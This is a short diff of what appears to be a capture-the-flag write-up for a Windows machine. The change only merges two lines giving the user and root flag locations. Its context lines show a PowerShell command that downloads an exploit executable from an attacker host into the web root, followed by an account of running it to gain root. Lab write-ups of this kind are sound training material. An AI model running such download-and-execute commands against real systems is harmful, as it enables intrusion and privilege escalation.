@@ -108,5 +108,4 @@ Start a python web server in the directory where the file to be transferred is a
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:3000/40564.exe', 'c:\inetpub\wwwroot\40564.exe')"
 ```
 After this i executed the file and ***very fortunately*** finally got root. 
-User flag is in c:\Users\babis\Desktop
-Root flag is in c:\Users\Administrator\Desktop
+User flag is in c:\Users\babis\Desktop and Root flag is in c:\Users\Administrator\Desktop
